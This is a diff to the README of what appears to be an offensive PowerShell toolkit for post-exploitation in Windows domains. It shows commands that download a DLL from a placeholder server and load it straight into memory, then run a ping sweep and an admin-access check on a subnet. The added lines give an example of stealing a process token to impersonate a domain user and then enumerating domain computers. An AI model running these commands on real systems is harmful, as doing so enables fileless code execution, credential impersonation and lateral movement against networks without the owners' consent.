@@ -10,7 +10,7 @@ Load it
 $a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
 Import-Module -Assembly $a
 
-Untested but should work.
+Untested but should work. maybe.
 $test=((IWR -Uri 'http://yourserver/turtletoolkit.dll' -UseBasicParsing).RawContent);
 $len=$test.length;$test.SubString($len-($len -198));$a=[System.Reflection.Assembly]::Load($test);
 Import-Module -Assembly $a
@@ -29,7 +29,14 @@ foreach($h in $s){Invoke-AdminCheck -t $h}
 
 Invoke-AdminCheck -h $(Invoke-PingSweep -s "172.16.75.0")
 ```
-Example
+Example of impersonation via process token then running SharpView as that domain user
+```powershell
+Invoke-TokenStealer -procH $false
+
+Get-CurrentIdentity
+
+Invoke-TurtleView -c "Get-DomainComputers"
+```
 
 
 ## List of cmdlets
